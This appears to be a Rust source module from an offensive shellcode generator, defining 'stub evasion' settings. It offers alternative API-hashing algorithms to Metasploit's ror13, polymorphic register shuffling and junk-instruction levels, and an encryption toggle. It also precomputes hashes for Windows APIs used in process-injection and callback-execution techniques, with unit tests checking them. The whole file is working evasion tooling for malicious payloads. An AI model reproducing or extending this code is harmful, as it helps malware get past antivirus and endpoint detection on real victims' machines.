//! Stub evasion types: hash algorithm selection, polymorphic level, encryption toggle.
#![allow(dead_code)]

use anyhow::{anyhow, Result};

/// Hash algorithm for block_api resolver
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HashAlgorithm {
    /// Original Metasploit ror13 (default, backward compatible)
    Ror13,
    /// DJB2: hash = hash * 33 + c, init = 5381
    Djb2,
    /// FNV-1a: hash = (hash ^ c) * 0x01000193, init = 0x811c9dc5
    Fnv1a,
}

impl HashAlgorithm {
    pub fn from_str(s: &str) -> Result<Self> {
        match s.to_lowercase().as_str() {
            "ror13" => Ok(Self::Ror13),
            "djb2" => Ok(Self::Djb2),
            "fnv1a" | "fnv" => Ok(Self::Fnv1a),
            _ => Err(anyhow!(
                "Unknown hash algorithm: '{}'. Available: ror13, djb2, fnv1a",
                s
            )),
        }
    }

    pub fn list() -> &'static [&'static str] {
        &["ror13", "djb2", "fnv1a"]
    }

    /// Pick a random non-ror13 algorithm
    pub fn random_non_default() -> Self {
        use std::time::{SystemTime, UNIX_EPOCH};
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos() as usize;
        let choices = [Self::Djb2, Self::Fnv1a];
        choices[seed % choices.len()]
    }
}

impl std::fmt::Display for HashAlgorithm {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Ror13 => write!(f, "ror13"),
            Self::Djb2 => write!(f, "djb2"),
            Self::Fnv1a => write!(f, "fnv1a"),
        }
    }
}

/// Polymorphic transformation level
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum PolyLevel {
    /// No polymorphism (deterministic output)
    None,
    /// Register reallocation only
    RegShuffle,
    /// Full: reg shuffle + equivalent instruction substitution + junk insertion
    Full,
}

impl PolyLevel {
    pub fn from_str(s: &str) -> Result<Self> {
        match s.to_lowercase().as_str() {
            "none" => Ok(Self::None),
            "reg" | "regshuffle" | "reg_shuffle" => Ok(Self::RegShuffle),
            "full" => Ok(Self::Full),
            _ => Err(anyhow!(
                "Unknown poly level: '{}'. Available: none, reg, full",
                s
            )),
        }
    }
}

impl std::fmt::Display for PolyLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::None => write!(f, "none"),
            Self::RegShuffle => write!(f, "reg_shuffle"),
            Self::Full => write!(f, "full"),
        }
    }
}

/// Stub evasion configuration (A+B+C layers combined)
#[derive(Debug, Clone)]
pub struct StubEvasion {
    /// A-layer: hash algorithm selection
    pub hash_algorithm: HashAlgorithm,
    /// B-layer: polymorphic transformation level
    pub poly_level: PolyLevel,
    /// C-layer: stub self-decryption wrapper
    pub encrypt: bool,
    /// RNG seed (0 = random from OS)
    pub seed: u64,
}

impl Default for StubEvasion {
    fn default() -> Self {
        Self {
            hash_algorithm: HashAlgorithm::Ror13,
            poly_level: PolyLevel::None,
            encrypt: false,
            seed: 0,
        }
    }
}

impl StubEvasion {
    /// Check if any evasion is enabled
    pub fn is_enabled(&self) -> bool {
        self.hash_algorithm != HashAlgorithm::Ror13
            || self.poly_level != PolyLevel::None
            || self.encrypt
    }

    /// Create from evasion preset string
    pub fn from_preset(preset: &str) -> Result<Self> {
        match preset.to_lowercase().as_str() {
            "none" => Ok(Self::default()),
            "basic" => Ok(Self {
                hash_algorithm: HashAlgorithm::random_non_default(),
                poly_level: PolyLevel::None,
                encrypt: false,
                seed: 0,
            }),
            "poly" => Ok(Self {
                hash_algorithm: HashAlgorithm::random_non_default(),
                poly_level: PolyLevel::Full,
                encrypt: false,
                seed: 0,
            }),
            "full" => Ok(Self {
                hash_algorithm: HashAlgorithm::random_non_default(),
                poly_level: PolyLevel::Full,
                encrypt: true,
                seed: 0,
            }),
            _ => Err(anyhow!(
                "Unknown evasion preset: '{}'. Available: none, basic, poly, full",
                preset
            )),
        }
    }
}

/// Pre-computed API hash table for a specific algorithm
#[derive(Debug, Clone)]
pub struct ApiHashTable {
    pub virtual_alloc: u32,
    pub create_thread: u32,
    pub wait_for_single_object: u32,
    pub sleep: u32,
    pub convert_thread_to_fiber: u32,
    pub create_fiber: u32,
    pub switch_to_fiber: u32,
    pub queue_user_apc: u32,
    pub load_library_a: u32,
    pub enum_system_locales_a: u32,
    pub nt_test_alert: u32,
    pub nt_create_thread_ex: u32,
    pub tp_alloc_work: u32,
    pub tp_post_work: u32,
    pub tp_release_work: u32,
    pub enum_fonts_a: u32,
    pub get_dc: u32,
}

// ===== Hash computation functions =====

/// Compute ror13 module hash (UTF-16LE with null terminator, uppercase)
fn ror13_module_hash(name: &str) -> u32 {
    let mut hash: u32 = 0;
    // Process as UTF-16LE bytes (including null terminator)
    let upper = name.to_uppercase();
    let utf16: Vec<u16> = upper.encode_utf16().chain(std::iter::once(0u16)).collect();
    let bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
    for &b in &bytes {
        hash = hash.rotate_right(13);
        hash = hash.wrapping_add(b as u32);
    }
    hash
}

/// Compute ror13 function hash (ASCII with null terminator)
fn ror13_func_hash(name: &str) -> u32 {
    let mut hash: u32 = 0;
    for &b in name.as_bytes().iter().chain(std::iter::once(&0u8)) {
        hash = hash.rotate_right(13);
        hash = hash.wrapping_add(b as u32);
    }
    hash
}

/// Compute DJB2 module hash (UTF-16LE with null terminator, uppercase)
fn djb2_module_hash(name: &str) -> u32 {
    let mut hash: u32 = 5381;
    let upper = name.to_uppercase();
    let utf16: Vec<u16> = upper.encode_utf16().chain(std::iter::once(0u16)).collect();
    let bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
    for &b in &bytes {
        hash = hash.wrapping_mul(33).wrapping_add(b as u32);
    }
    hash
}

/// Compute DJB2 function hash (ASCII with null terminator)
fn djb2_func_hash(name: &str) -> u32 {
    let mut hash: u32 = 5381;
    for &b in name.as_bytes().iter().chain(std::iter::once(&0u8)) {
        hash = hash.wrapping_mul(33).wrapping_add(b as u32);
    }
    hash
}

/// Compute FNV-1a module hash (UTF-16LE with null terminator, uppercase)
fn fnv1a_module_hash(name: &str) -> u32 {
    let mut hash: u32 = 0x811c9dc5;
    let upper = name.to_uppercase();
    let utf16: Vec<u16> = upper.encode_utf16().chain(std::iter::once(0u16)).collect();
    let bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
    for &b in &bytes {
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193);
    }
    hash
}

/// Compute FNV-1a function hash (ASCII with null terminator)
fn fnv1a_func_hash(name: &str) -> u32 {
    let mut hash: u32 = 0x811c9dc5;
    for &b in name.as_bytes().iter().chain(std::iter::once(&0u8)) {
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193);
    }
    hash
}

/// Compute combined API hash for a given algorithm
pub fn compute_api_hash(algo: &HashAlgorithm, module: &str, function: &str) -> u32 {
    match algo {
        HashAlgorithm::Ror13 => ror13_module_hash(module).wrapping_add(ror13_func_hash(function)),
        HashAlgorithm::Djb2 => djb2_module_hash(module).wrapping_add(djb2_func_hash(function)),
        HashAlgorithm::Fnv1a => fnv1a_module_hash(module).wrapping_add(fnv1a_func_hash(function)),
    }
}

/// Build hash table for a given algorithm
pub fn build_hash_table(algo: &HashAlgorithm) -> ApiHashTable {
    ApiHashTable {
        virtual_alloc: compute_api_hash(algo, "kernel32.dll", "VirtualAlloc"),
        create_thread: compute_api_hash(algo, "kernel32.dll", "CreateThread"),
        wait_for_single_object: compute_api_hash(algo, "kernel32.dll", "WaitForSingleObject"),
        sleep: compute_api_hash(algo, "kernel32.dll", "Sleep"),
        convert_thread_to_fiber: compute_api_hash(algo, "kernel32.dll", "ConvertThreadToFiber"),
        create_fiber: compute_api_hash(algo, "kernel32.dll", "CreateFiber"),
        switch_to_fiber: compute_api_hash(algo, "kernel32.dll", "SwitchToFiber"),
        queue_user_apc: compute_api_hash(algo, "kernel32.dll", "QueueUserAPC"),
        load_library_a: compute_api_hash(algo, "kernel32.dll", "LoadLibraryA"),
        enum_system_locales_a: compute_api_hash(algo, "kernel32.dll", "EnumSystemLocalesA"),
        nt_test_alert: compute_api_hash(algo, "ntdll.dll", "NtTestAlert"),
        nt_create_thread_ex: compute_api_hash(algo, "ntdll.dll", "NtCreateThreadEx"),
        tp_alloc_work: compute_api_hash(algo, "ntdll.dll", "TpAllocWork"),
        tp_post_work: compute_api_hash(algo, "ntdll.dll", "TpPostWork"),
        tp_release_work: compute_api_hash(algo, "ntdll.dll", "TpReleaseWork"),
        enum_fonts_a: compute_api_hash(algo, "gdi32.dll", "EnumFontsA"),
        get_dc: compute_api_hash(algo, "user32.dll", "GetDC"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ror13_known_hashes() {
        // Cross-validate against known ror13 constants from pe.rs
        let table = build_hash_table(&HashAlgorithm::Ror13);
        assert_eq!(
            table.virtual_alloc, 0xe553a458,
            "VirtualAlloc hash mismatch"
        );
        assert_eq!(
            table.create_thread, 0x160d6838,
            "CreateThread hash mismatch"
        );
        assert_eq!(
            table.wait_for_single_object, 0x601d8708,
            "WaitForSingleObject hash mismatch"
        );
        assert_eq!(table.sleep, 0xe035f044, "Sleep hash mismatch");
        assert_eq!(
            table.queue_user_apc, 0x3e8802d6,
            "QueueUserAPC hash mismatch"
        );
        assert_eq!(table.nt_test_alert, 0xf3afa26d, "NtTestAlert hash mismatch");
        assert_eq!(
            table.load_library_a, 0x0726774c,
            "LoadLibraryA hash mismatch"
        );
        assert_eq!(table.enum_fonts_a, 0xf2108379, "EnumFontsA hash mismatch");
        assert_eq!(table.get_dc, 0x5c2f01fc, "GetDC hash mismatch");
    }

    #[test]
    fn test_djb2_different_from_ror13() {
        let ror13 = build_hash_table(&HashAlgorithm::Ror13);
        let djb2 = build_hash_table(&HashAlgorithm::Djb2);
        assert_ne!(ror13.virtual_alloc, djb2.virtual_alloc);
        assert_ne!(ror13.create_thread, djb2.create_thread);
    }

    #[test]
    fn test_fnv1a_different_from_ror13() {
        let ror13 = build_hash_table(&HashAlgorithm::Ror13);
        let fnv1a = build_hash_table(&HashAlgorithm::Fnv1a);
        assert_ne!(ror13.virtual_alloc, fnv1a.virtual_alloc);
        assert_ne!(ror13.create_thread, fnv1a.create_thread);
    }

    #[test]
    fn test_hash_table_no_collisions() {
        // Verify no two different APIs produce the same hash within each algorithm
        for algo in &[
            HashAlgorithm::Ror13,
            HashAlgorithm::Djb2,
            HashAlgorithm::Fnv1a,
        ] {
            let t = build_hash_table(algo);
            let hashes = vec![
                t.virtual_alloc,
                t.create_thread,
                t.wait_for_single_object,
                t.sleep,
                t.convert_thread_to_fiber,
                t.create_fiber,
                t.switch_to_fiber,
                t.queue_user_apc,
                t.load_library_a,
                t.enum_system_locales_a,
                t.nt_test_alert,
                t.nt_create_thread_ex,
                t.tp_alloc_work,
                t.tp_post_work,
                t.tp_release_work,
                t.enum_fonts_a,
                t.get_dc,
            ];
            let unique: std::collections::HashSet<u32> = hashes.iter().cloned().collect();
            assert_eq!(
                hashes.len(),
                unique.len(),
                "Hash collision detected for algorithm {:?}",
                algo
            );
        }
    }

    #[test]
    fn test_evasion_presets() {
        let none = StubEvasion::from_preset("none").unwrap();
        assert_eq!(none.hash_algorithm, HashAlgorithm::Ror13);
        assert_eq!(none.poly_level, PolyLevel::None);
        assert!(!none.encrypt);

        let full = StubEvasion::from_preset("full").unwrap();
        assert_ne!(full.hash_algorithm, HashAlgorithm::Ror13);
        assert_eq!(full.poly_level, PolyLevel::Full);
        assert!(full.encrypt);
    }

    #[test]
    fn test_evasion_is_enabled() {
        assert!(!StubEvasion::default().is_enabled());
        assert!(StubEvasion::from_preset("basic").unwrap().is_enabled());
    }
}
